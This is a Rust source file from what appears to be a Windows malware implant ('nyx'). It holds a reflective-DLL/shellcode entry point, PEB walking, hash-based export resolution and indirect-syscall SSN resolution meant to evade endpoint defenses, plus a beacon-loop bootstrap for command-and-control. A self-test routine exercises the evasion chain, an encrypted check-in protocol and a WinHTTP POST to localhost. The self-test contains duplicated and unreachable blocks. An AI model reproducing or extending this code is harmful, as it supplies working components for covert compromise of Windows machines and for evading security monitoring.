//! PIC entry point + task loop bootstrap.
//!
//! For a `cdylib`/shellcode implant the "entry" is an exported function the
//! loader calls (reflective DLL injection) or a thread the host spins up. It:
//!   1. locates ntdll + resolves the API set it needs (no allocation yet),
//!   2. the global allocator self-bootstraps on first `alloc`,
//!   3. runs the beacon loop: check-in → receive tasks → execute → repeat.
//!
//! All Windows-only. On the dev host this module is excluded by cfg.
//!
//! The real PIC extraction (Stardust-style sRDI) turns the cdylib into raw
//! position-independent shellcode whose first byte is the entry below. Until
//! that extraction step exists, the function is the reflective entry a
//! host-side loader calls after mapping the DLL.

#![cfg(target_os = "windows")]

use crate::resolve::LiveNtdll;

/// The reflective/PIC entry. Resolves ntdll, builds the SSN table, primes the
/// indirect-syscall runtime, then enters the beacon loop.
///
/// Marked `#[no_mangle]` so it survives `opt-level="z"` and is the address sRDI
/// extraction marks as the entry point.
#[no_mangle]
pub unsafe extern "system" fn nyx_entry() {
    // 1. PEB-walk ntdll + resolve the SSN table (validates resolve.rs).
    let Some(ntdll) = LiveNtdll::locate() else {
        core::hint::spin_loop();
        return;
    };
    let _ssn_table = ntdll.resolve_table_owned();

    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs.
    //    This is what turns nyx_evasion from an algorithm into a live runtime.
    let _syscall_rt = crate::syscalls::Runtime::init();

    // 3. Enter the beacon loop (WinHTTP check-in + task loop).
    crate::beacon::beacon_loop();
}

/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
/// table, and exits the process with a code reporting the result:
///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
///   - exit code = 0xFFFFFFFF = ntdll could not be located
///
/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
/// table → SSN resolution) on a real Windows host without any network activity
/// or persistence — a benign closed-loop check.
/// Exit with `code` via the resolved ExitProcess; traps if unavailable.
unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
    if let Some(e) = exit_proc {
        let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
        f(code);
    }
    loop { core::hint::spin_loop(); }
}

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");

    // Pure no-alloc self-test: PEB walk -> ntdll -> count exports -> report.
    // No Vec, no String, no alloc — isolates whether alloc is the problem.
    let base = match LiveNtdll::locate_base() {
        Some(b) => b,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    let n_names: u32 = if export_rva == 0 {
        0
    } else {
        let dir = base.add(export_rva as usize) as *const crate::resolve::ExportDirectory;
        (*dir).number_of_names
    };

    // Manual NtAllocateVirtualMemory test (bypass the allocator machinery).
    // Resolve the fn, call it directly with a stack buffer, report status.
    let ntav = crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory");
    if ntav.is_none() {
        report_exit(exit_proc, 0x800);
    }
    let f: unsafe extern "system" fn(*mut core::ffi::c_void, *mut *mut core::ffi::c_void, *mut usize, *mut usize, u32, u32) -> i32 = core::mem::transmute(ntav.unwrap());
    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut zb: usize = 0;
    let mut sz: usize = 4096;
    let cur: *mut core::ffi::c_void = (-1isize) as *mut core::ffi::c_void;
    let status = f(cur, &mut base, &mut zb, &mut sz, 0x3000, 0x04);
    // Force allocator resolution (sets the static NT_ALLOC) BEFORE any Vec use.
    crate::ntalloc::force_resolve();
    // Full SSN resolve: LiveNtdll::locate() -> named_exports() (allocs) ->
    // resolve_table_owned() (Hell's/Halo's/Tartarus' Gate over live ntdll).
    // Exit 0x100 + N where N = resolved SSN count.
    let ntdll = match LiveNtdll::locate() {
        Some(n) => n,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let table = ntdll.resolve_table_owned();
    let ssn_count = table.iter().filter(|(_, ssn)| *ssn != u32::MAX).count() as u32;
    // (SSN count already proven == 0xA3D; now test transport.)
    let _ = ssn_count;

    // Protocol round-trip (no network): X25519 + ChaCha20Poly1305 + frame codec.
    // 0xE01 = success; 0xE00 = failure.
    let ikp = nyx_protocol::ImplantKeypair::generate();
    let dummy_server_pub = [0x42u8; 32];
    let key = ikp.session_key(&dummy_server_pub);
    let pubkey = ikp.public_bytes();
    let plaintext = b"check-in-test-payload";
    let frame = nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext);
    let raw = match nyx_protocol::parse_frame(&frame) {
        Ok(r) => r,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    let decoded = match nyx_protocol::open_frame(&key, &raw) {
        Ok(p) => p,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    if decoded.as_slice() == plaintext.as_slice() {
        report_exit(exit_proc, 0xE01);
    }
    report_exit(exit_proc, 0xE00);

    // Transport test: POST a known payload to the local Python echo server
    // (127.0.0.1:8443/beacon), which echoes the body back. Verify round-trip.
    // Exit: 0xC01 = success (response matches sent bytes); 0xC00 = transport
    // call failed; 0xC02 = response length mismatch.
    let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
    // Diagnostic transport test: inline the WinHTTP steps to pinpoint failure.
    // 0xD00 = LoadLibraryA(winhttp) failed
    // 0xD01 = WinHttpOpen failed
    // 0xD02 = WinHttpConnect failed
    // 0xD03 = WinHttpOpenRequest failed
    // 0xD04 = WinHttpSendRequest failed
    // 0xD05 = WinHttpReceiveResponse failed
    // 0xD06 = query/read returned no data
    // 0xD07 = SUCCESS, body matches
    // 0xD08 = SUCCESS but body mismatch
    // First: LoadLibraryA(winhttp.dll)
    type LLA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
    let lla_addr = crate::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA");
    if lla_addr.is_none() { report_exit(exit_proc, 0xD00); }
    let lla: LLA = core::mem::transmute(lla_addr.unwrap());
    let h = lla(b"winhttp.dll\0".as_ptr());
    if h.is_null() { report_exit(exit_proc, 0xD00); }
    // WinHttpOpen
    type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> *mut core::ffi::c_void;
    let wo = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpOpen").unwrap();
    let wo_fn: FOpen = core::mem::transmute(wo);
    let ua: crate::heap::Vec<u16> = b"Mozilla/5.0".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
    let session = wo_fn(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
    if session.is_null() { report_exit(exit_proc, 0xD01); }
    // WinHttpConnect
    type FConn = unsafe extern "system" fn(*mut core::ffi::c_void, *const u16, u16, u32) -> *mut core::ffi::c_void;
    let wc = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpConnect").unwrap();
    let wc_fn: FConn = core::mem::transmute(wc);
    let host: crate::heap::Vec<u16> = b"127.0.0.1".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
    let conn = wc_fn(session, host.as_ptr(), 8443, 0);
    if conn.is_null() { report_exit(exit_proc, 0xD02); }
    // WinHttpOpenRequest
    type FReq = unsafe extern "system" fn(*mut core::ffi::c_void, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32, u32) -> *mut core::ffi::c_void;
    let wor = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpOpenRequest").unwrap();
    let wor_fn: FReq = core::mem::transmute(wor);
    let verb: crate::heap::Vec<u16> = b"POST".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
    let path: crate::heap::Vec<u16> = b"/beacon".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
    let req = wor_fn(conn, verb.as_ptr(), path.as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
    if req.is_null() { report_exit(exit_proc, 0xD03); }
    // WinHttpSendRequest
    type FSend = unsafe extern "system" fn(*mut core::ffi::c_void, *const u8, u32, *const u8, u32, u32, usize) -> i32;
    let wsr = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpSendRequest").unwrap();
    let wsr_fn: FSend = core::mem::transmute(wsr);
    let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
    let ok = wsr_fn(req, core::ptr::null(), 0, payload.as_ptr(), 8, 8, 0);
    if ok == 0 { report_exit(exit_proc, 0xD04); }
    // WinHttpReceiveResponse
    type FRecv = unsafe extern "system" fn(*mut core::ffi::c_void, *const core::ffi::c_void) -> i32;
    let wrr = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpReceiveResponse").unwrap();
    let wrr_fn: FRecv = core::mem::transmute(wrr);
    if wrr_fn(req, core::ptr::null()) == 0 { report_exit(exit_proc, 0xD05); }
    // Read data
    type FQuery = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32;
    let wq = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable").unwrap();
    let wq_fn: FQuery = core::mem::transmute(wq);
    type FRead = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u8, u32, *mut u32) -> i32;
    let wr = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpReadData").unwrap();
    let wr_fn: FRead = core::mem::transmute(wr);
    let mut avail: u32 = 0;
    let rc = wq_fn(req, &mut avail);
    if rc == 0 || avail == 0 { report_exit(exit_proc, 0xD06); }
    let mut buf = crate::heap::vec![0u8; avail as usize];
    let mut got: u32 = 0;
    let rc2 = wr_fn(req, buf.as_mut_ptr(), avail, &mut got);
    if rc2 == 0 || got == 0 { report_exit(exit_proc, 0xD06); }
    if got as usize == payload.len() && buf[..got as usize] == payload[..] {
        report_exit(exit_proc, 0xD07);
    }
    report_exit(exit_proc, 0xD08);

    // Phase: protocol round-trip (proves crypto works under no_std + this alloc).
    // Generate implant keypair, derive session key against a dummy server pubkey,
    // encode a frame, decode it, verify the plaintext matches.
    // 0xE01 = protocol round-trip success
    // 0xE00 = protocol round-trip failed
    let ikp = nyx_protocol::ImplantKeypair::generate();
    let dummy_server_pub = [0x42u8; 32];
    let key = ikp.session_key(&dummy_server_pub);
    let pubkey = ikp.public_bytes();
    let plaintext = b"check-in-test-payload";
    let frame = nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext);
    let raw = match nyx_protocol::parse_frame(&frame) {
        Ok(r) => r,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    let decoded = match nyx_protocol::open_frame(&key, &raw) {
        Ok(p) => p,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    if decoded.as_slice() == plaintext.as_slice() {
        report_exit(exit_proc, 0xE01);
    }
    report_exit(exit_proc, 0xE00);
}

/// Resolve a function in a loaded module by (module name, function name).
/// Returns the absolute address. Both via PEB walk + export table (no IAT).
unsafe fn resolve_export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
    let mod_hash = djb2_hash(module);
    let fn_hash = djb2_hash(func);
    let peb = peb_ptr()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    while head as *const u8 != start {
        let entry = head as *mut crate::resolve::ListEntry;
        let nb = (*entry).base_dll_name.buffer;
        let nl = (*entry).base_dll_name.length as usize / 2;
        if !nb.is_null() && nl > 0 {
            let chars = core::slice::from_raw_parts(nb, nl);
            if djb2_hash_u16(chars) == mod_hash {
                let base = (*entry).dll_base as *mut u8;
                return export_addr_by_hash(base, fn_hash);
            }
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// djb2 over ASCII bytes (lowercased), matching the export table's storage.
fn djb2_hash(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        h = h.wrapping_mul(33).wrapping_add(b.to_ascii_lowercase() as u32);
    }
    h
}

/// djb2 over UTF-16 (low byte only, lowercased) — for the PEB's Unicode module names.
fn djb2_hash_u16(chars: &[u16]) -> u32 {
    let mut h: u32 = 5381;
    for &c in chars {
        let lo = (c & 0xff) as u8;
        h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
    }
    h
}

/// Walk a module's export table for a function whose name hashes to `fn_hash`.
/// Returns its absolute address.
unsafe fn export_addr_by_hash(base: *mut u8, fn_hash: u32) -> Option<usize> {
    use crate::resolve::ExportDirectory;
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    if export_rva == 0 {
        return None;
    }
    let dir = base.add(export_rva as usize) as *const ExportDirectory;
    let n = (*dir).number_of_names as usize;
    let names = base.add((*dir).address_of_names as usize) as *const u32;
    let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
    let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
    for i in 0..n {
        let name_rva = *names.add(i);
        let name_ptr = base.add(name_rva as usize);
        // Hash the C string.
        let mut h: u32 = 5381;
        let mut p = name_ptr;
        while *p != 0 {
            h = h.wrapping_mul(33).wrapping_add((*p).to_ascii_lowercase() as u32);
            p = p.add(1);
        }
        if h == fn_hash {
            let ord = *ordinals.add(i) as usize;
            let fn_rva = *funcs.add(ord);
            return Some(base.add(fn_rva as usize) as usize);
        }
    }
    None
}

#[cfg(target_arch = "x86_64")]
unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
    let peb: *mut crate::resolve::Peb;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    Some(peb)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
    None
}
